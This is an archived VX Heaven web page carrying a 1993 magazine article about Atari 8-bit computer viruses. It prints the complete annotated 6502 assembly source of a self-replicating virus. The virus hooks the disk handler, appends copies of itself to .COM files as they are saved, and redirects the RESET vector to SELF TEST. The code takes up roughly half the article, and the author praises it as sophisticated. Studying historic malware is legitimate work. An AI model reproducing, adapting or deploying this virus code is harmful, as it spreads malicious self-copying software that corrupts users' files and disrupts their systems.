<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Pirx 'Atari 8-bit virus' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Pirx"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Pirx,Atari 8-bit virus, repl, begn, fcnt, atari, reset, file, handler, software, block, word, data, gopu, initialisation, tajemnice, close"/>
<meta name="Description" content="In one of the previous MegaZines were several articles with titles containing the word &quot;virus&quot;. Of course my curiosity was infinite! &quot;Viruses on our favourite microcomputer?&quot; - I thought - &quot;That cannot be true!&quot;. And I was right... Those articles were about compression and other, after all, interesting subjects. But something happened - people in Poland began to talk about those dangerous life-forms. First that was treated as a joke, but then one guy who writes games for Mirage Software accused the second one of damaging his precious data! That second guy, well known musician, was maintaining to have done nothing about erasing any data. And here that famous word appeared the first time in the serious circumstances. The word &quot;VIRUS&quot;."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"98e85edd6ee61ddcf972317880066e6a0ba69a1f-1498755606-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vjw01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Atari 8-bit virus</h1><p><a href="/lib/?lang=en&amp;author=Pirx"> Pirx</a><br/> <em>Mega Magazine #6</em><br/> <em>October 1993</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vjw01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=VX#vjw01">Back to index</a>] [<a href="/lib/vjw01.html#disqus_thread">Comments</a>]<br/> 
<p>"New software from Poland (har!)"</p>
<p>In one of the previous MegaZines were several articles with titles containing the word "virus". Of course my curiosity was infinite! "Viruses on our favourite microcomputer?" - I thought - "That cannot be true!". And I was right... Those articles were about compression and other, after all, interesting subjects. But something happened - people in Poland began to talk about those dangerous life-forms. First that was treated as a joke, but then one guy who writes games for Mirage Software accused the second one of damaging his precious data! That second guy, well known musician, was maintaining to have done nothing about erasing any data. And here that famous word appeared the first time in the serious circumstances. The word "VIRUS".</p>
<p>Yes, that is no joke - a real, dangerous virus caused the first blood flood the XL/XE world. At last, guys of Mirage "caught" it - this malicious piece of software was written in the very clever way. Located on the first page of the memory ($0100 - the stack area) it worked with almost all modern XL/XE systems (i.e. in those with QMEG OS) and surely on standart hardware. After every infection it was increasing the counter, and when it was equal to 10, the disk formating process was activated. The virus was so clever to do everything only during saving, when write protection was removed. I am not presenting the technical details because this evil-minded virus is very similar to the next one caught in Poland. Probably they have only one author...</p>
<p>The second one is very "popular" here since it's source code was published in Polish biggest XL/XE magazine (Tajemnice Atari - Mysterys of Atari), descripted with full particulars. And this is why I decided to translate partially this article, including ofcourse the source code. Unhappy this was written using Quick Assembler - the own invention of Avalon and Tajemnice Atari guys, but there should be no bigger troubles with converting it to one of the standart (macro)assemblers.</p>
<p>The descripted below virus has got only one purpose - to multiply itself - in it's code there are no destuctive sequences, but it doesn't mean it is safe. It causes extension of file lenght (may fullfil a disk faster, when expected) and may crash the system because of it's localisation - page six, which is heavily used by lots of applications. Our hero attacks only .COM files being saved on disk drive (only D: device). The only, wilful action of it is changing RESET vectors to SELF TEST address. On non-altered XL/XE system it is neccesary to turn off the computer (presing reset key causes jump to SELF TEST again). Most people do not like turning off ond on theirs micros and after such a experience they will seldom reach for the reset key. And the virus only waits for it, because reset kills that bad animal. Sometimes it can slow down the rate of disk operations, but now always - the virus is written by the real expert with the very good knowledge of XL/XE operating system. I needn't to mention that sometimes even the inconsiderable change in page six may cause a fail in I/O operations and damage of data on a disk.</p>
<p>And here comes the source code:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">boot <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">09</span><br/>
dosi <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span>0c<br/>
fcnt <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span>1d<br/>
<span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span>1e<br/>
<span style="color: #0000ff; font-weight: bold;">data</span> <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">2f</span><br/>
htbs <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span>31a<br/>
self <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #0000ff; font-weight: bold;">$</span>c901<br/>
<br/>
&nbsp; &nbsp; &nbsp;org <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">600</span><br/>
<br/>
begn dta a<span style="color: black;">&#40;</span>begn<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp;dta a<span style="color: black;">&#40;</span>begn<span style="color: #339933;">+</span>lght<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp;</div>
<p>This strange beginning is a repetition of the DOS header, which is on the beginning of the binary code of the virus. Dos is not loading to the memory those headers and the virus must keep it itself in purpose to future multiply. dta a(begn) means .word begn in MAC65, for example.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">main <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #339933;">*</span><br/>
<span style="color: #339933;">*</span> <span style="color: #7f007f;">'D'</span> entry search<br/>
&nbsp; &nbsp; &nbsp;ldx #<span style="color: #ff0000;">0</span><br/>
dsrc lda htbs<span style="color: #339933;">,</span>x<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> #<span style="color: #7f007f;">'D'</span><br/>
&nbsp; &nbsp; &nbsp;beq foun<br/>
&nbsp; &nbsp; &nbsp;inx<br/>
&nbsp; &nbsp; &nbsp;inx<br/>
&nbsp; &nbsp; &nbsp;inx<br/>
&nbsp; &nbsp; &nbsp;cpx #<span style="color: #ff0000;">36</span><br/>
&nbsp; &nbsp; &nbsp;bcc dsrc<br/>
&nbsp; &nbsp; &nbsp;rts<br/>
<span style="color: #339933;">*</span> trap table address<br/>
foun lda #<span style="color: #ff0000;">6</span> &nbsp;page six!<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> htbs<span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: #339933;">,</span>x<br/>
&nbsp; &nbsp; &nbsp;beq retu<br/>
&nbsp; &nbsp; &nbsp;ldy #<span style="color: #ff0000;">1</span><br/>
ttlp lda htbs<span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: #339933;">,</span>x<br/>
&nbsp; &nbsp; &nbsp;sta addr<span style="color: #339933;">,</span>y<br/>
&nbsp; &nbsp; &nbsp;lda mtad<span style="color: #339933;">,</span>y<br/>
&nbsp; &nbsp; &nbsp;sta htbs<span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: #339933;">,</span>x<br/>
&nbsp; &nbsp; &nbsp;dex<br/>
&nbsp; &nbsp; &nbsp;dey<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">bpl</span> ttlp<br/>
retu rts<br/>
&nbsp;</div>
<p>The address of the former (OS) handler is saved inside the DOPR routine in purpose to continue I/O operations as if nothing happened. The virus doesn't care about previous value of DOSI and BOOT vectors, but it is made to cause troubles...</p>
<p>This is the end of the virus installation. It found address of "D:" handler and changed it to its own. This is not performed if there is no "D:" device or virus is already located on page 6. Now comes new I/O routines</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*----</span> open<br/>
<br/>
xopn lda &lt;self&gt;<br/>
&nbsp; &nbsp; &nbsp;sta dosi<br/>
&nbsp; &nbsp; &nbsp;lda &gt;self<br/>
&nbsp; &nbsp; &nbsp;sta dosi<span style="color: #339933;">+</span><span style="color: #ff0000;">1</span><br/>
&nbsp; &nbsp; &nbsp;ldy #<span style="color: #ff0000;">2</span><br/>
&nbsp; &nbsp; &nbsp;sty fcnt<br/>
&nbsp; &nbsp; &nbsp;dey<br/>
&nbsp; &nbsp; &nbsp;sty boot<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">bpl</span> dopr<br/>
&nbsp;</div>
<p>Every opening of file will cause setting BOOT to 1 - this warrants that after pressing RESET system will jump through DOSI vector. This is why one can not get away from SELF TEST mode (on standart machines, of course...). Also one very important counter (FCNT) is initialized. FCNT is then used to determine if file has on the beginning two $FF bytes (normally, only binary files have a header like this - $ff, $ff, &lt;beg.adr,> beg.adr, &lt;end.adr,> end.adr - those are so called .COM files (this is also known as DOS format)). On the end of the OPEN routine is jump to DOPR with 1 in Y register, what causes jump to original OPEN.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*----</span> put <span style="color: #0000ff; font-weight: bold;">byte</span><br/>
<br/>
xput ldy fcnt<br/>
&nbsp; &nbsp; &nbsp;dey<br/>
&nbsp; &nbsp; &nbsp;bmi gopu<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> #<span style="color: #0000ff; font-weight: bold;">$</span>ff<br/>
&nbsp; &nbsp; &nbsp;beq <span style="color: #339933;">*+</span><span style="color: #ff0000;">4</span><br/>
&nbsp; &nbsp; &nbsp;ldy #<span style="color: #0000ff; font-weight: bold;">$</span>ff<br/>
&nbsp; &nbsp; &nbsp;sty fcnt<br/>
gopu ldy #<span style="color: #ff0000;">7</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">bpl</span> dopr &nbsp;<span style="color: black;">&#40;</span><span style="color: #00007f; font-weight: bold;">jmp</span><span style="color: black;">&#41;</span><br/>
&nbsp;</div>
<p>Very interesting trick is used here: FCNT counter is equal zero after sending two $ff bytes. In any other occasion it is set to $ff. Both of those values prevents FCNT from changing in future. FCNT will serve as the file type flag in CLOSE routine. Jump to DOPR with 7 in Y will of course continue system put.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*----</span> close<br/>
<br/>
xclo ldy fcnt<br/>
&nbsp; &nbsp; &nbsp;bne gocl<br/>
&nbsp; &nbsp; &nbsp;ldy #<span style="color: #ff0000;">4</span><br/>
&nbsp; &nbsp; &nbsp;sty <span style="color: #0000ff; font-weight: bold;">byte</span><br/>
&nbsp; &nbsp; &nbsp;jsr repl<br/>
&nbsp; &nbsp; &nbsp;ldy #<span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp;sty fcnt<br/>
&nbsp; &nbsp; &nbsp;ldy &lt;lgth&gt;<br/>
&nbsp; &nbsp; &nbsp;sty <span style="color: #0000ff; font-weight: bold;">byte</span><br/>
&nbsp; &nbsp; &nbsp;jsr repl<br/>
&nbsp; &nbsp; &nbsp;ldy &lt;lgth<span style="color: #339933;">-</span><span style="color: #ff0000;">6</span>&gt;<br/>
&nbsp; &nbsp; &nbsp;sty fcnt<br/>
&nbsp; &nbsp; &nbsp;jsr repl<br/>
gocl ldy #<span style="color: #ff0000;">3</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">bpl</span> dopr <span style="color: black;">&#40;</span><span style="color: #00007f; font-weight: bold;">jmp</span><span style="color: black;">&#41;</span><br/>
&nbsp;</div>
<p>The close routine is simple but how efficient! The bacteria checks the file type and the current operation. For reading FCNT=2 and if the file is not .COM type, FCNT=$ff. Then the virus politely returns control to original CLOSE. But FCNT=0 means saving the file in DOS format. In this point all data of original file were succesfully transferred and now is time for multiplying! It's not easy because the bacteria must generate not only its'body but also a header and run addres, neccesary in the future life... As before, FCNT counter was cleverly used here: it is now equal to zero and points to the place from where copying will begin. The BYTE address fixes the end of the block for saving. The four bytes long block is copied twice to provide a header for DOS and a copy for future generations. The same is with the initialisation address at the end of the virus. Following routine saves one data block.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*----</span> body repl<br/>
<br/>
<span style="color: #00007f; font-weight: bold;">loop</span> <span style="color: #00007f; font-weight: bold;">inc</span> fcnt<br/>
&nbsp; &nbsp; &nbsp;lda begn<span style="color: #339933;">,</span>y<br/>
&nbsp; &nbsp; &nbsp;jsr gopu<br/>
repl ldy fcnt<br/>
&nbsp; &nbsp; &nbsp;cpy #byte<br/>
&nbsp; &nbsp; &nbsp;bne &nbsp;<span style="color: #00007f; font-weight: bold;">loop</span><br/>
&nbsp; &nbsp; &nbsp;rts<br/>
&nbsp;</div>
<p>It uses the PUT routine from original "D:" handler. Communication with that handler is performed by many times mentioned routine DOPR. For it the parameter (stored in Y register) is number of the older byte of the given address in a handler table (1 for OPEN, 3 for CLOSE, 5 for GET, and so on)</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*----</span> <span style="color: #0000ff; font-weight: bold;">do</span> <span style="color: #00007f; font-weight: bold;">std</span> proc<br/>
<br/>
xget ldy #<span style="color: #ff0000;">5</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">bpl</span> dopr &nbsp;<span style="color: black;">&#40;</span><span style="color: #00007f; font-weight: bold;">jmp</span><span style="color: black;">&#41;</span><br/>
xsta ldy #<span style="color: #ff0000;">9</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">bpl</span> dopr &nbsp;<span style="color: black;">&#40;</span><span style="color: #00007f; font-weight: bold;">jmp</span><span style="color: black;">&#41;</span><br/>
xspe ldy #<span style="color: #ff0000;">11</span><br/>
dopr sta <span style="color: #0000ff; font-weight: bold;">data</span><br/>
xadr lda <span style="color: #339933;">*,</span>y<br/>
addr <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #339933;">*-</span><span style="color: #ff0000;">2</span><br/>
&nbsp; &nbsp; &nbsp;pha<br/>
&nbsp; &nbsp; &nbsp;dey<br/>
&nbsp; &nbsp; &nbsp;tya<br/>
&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">ror</span> <span style="color: #339933;">*</span><br/>
&nbsp; &nbsp; &nbsp;bcc xadr<br/>
&nbsp; &nbsp; &nbsp;lda <span style="color: #0000ff; font-weight: bold;">data</span><br/>
&nbsp; &nbsp; &nbsp;rts<br/>
&nbsp;</div>
<p>Give your attention to the original loop construction, which will be done two times everytime, independently from the Y value (only for the odd numbers). The ADDR label shows the argument of the previous LDA instuction (modified during installation - the first routine!)</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*----</span> new table<br/>
<br/>
mtad dta a<span style="color: black;">&#40;</span>myta<span style="color: black;">&#41;</span><br/>
myta dta a<span style="color: black;">&#40;</span>xopn<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span> &nbsp;<span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp;dta a<span style="color: black;">&#40;</span>xclo<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span> &nbsp;<span style="color: #ff0000;">2</span><br/>
&nbsp; &nbsp; &nbsp;dta a<span style="color: black;">&#40;</span>xget<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span> &nbsp;<span style="color: #ff0000;">4</span><br/>
&nbsp; &nbsp; &nbsp;dta a<span style="color: black;">&#40;</span>xput<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span> &nbsp;<span style="color: #ff0000;">6</span><br/>
&nbsp; &nbsp; &nbsp;dta a<span style="color: black;">&#40;</span>xsta<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span> &nbsp;<span style="color: #ff0000;">8</span><br/>
&nbsp; &nbsp; &nbsp;dta a<span style="color: black;">&#40;</span>xspe<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><span style="color: black;">&#41;</span> &nbsp;a<br/>
&nbsp;</div>
<p>XGET, XSTA and XSPE are directing all not used by the virus functions to the original "D:" handler.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*----</span> init vect<br/>
<br/>
&nbsp; &nbsp; &nbsp;dta a<span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">2e2</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp;dta a<span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">2e3</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp;dta a<span style="color: black;">&#40;</span>main<span style="color: black;">&#41;</span><br/>
<br/>
<span style="color: #339933;">*----</span> total lenght<br/>
<br/>
lgth <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: #339933;">*-</span>begn<br/>
&nbsp;</div>
<p>The virus' body ends with the above initialisation block (for next generation). The real initialisation is just after it:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">*----</span> <span style="color: #0000ff; font-weight: bold;">do</span> it!<br/>
<br/>
&nbsp; &nbsp; &nbsp;org <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #ff0000;">2e2</span><br/>
&nbsp; &nbsp; &nbsp;dta a<span style="color: black;">&#40;</span>main<span style="color: black;">&#41;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp;end<br/>
&nbsp;</div>
<p>And that's all... Take care!!!! And notice the very advanced 6502 programming techniques! This piece of software is one of the most sophisticated programs I've ever seen...</p>
<p>I wish to thank Janusz B. Wisniewski for <a href="/lib/vjw00.html">the original text</a> (Tajemnice Atari 10/92). The translation was made WITHOUT author's permission and authorisation. But the subject is worth this little crime.... Thanks!</p>
<p>Pirx of Our 5oft</p>
[<a style="" href="/lib/?lang=EN&amp;index=VX#vjw01">Back to index</a>] [<a href="/lib/vjw01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vjw01">de</a><a href="/lib/index.php?lang=en&amp;id=vjw01">en</a><a href="/lib/index.php?lang=es&amp;id=vjw01">es</a><a href="/lib/index.php?lang=it&amp;id=vjw01">it</a><a href="/lib/index.php?lang=fr&amp;id=vjw01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vjw01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vjw01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vjw01">ua</a></div>
</body>
</html>
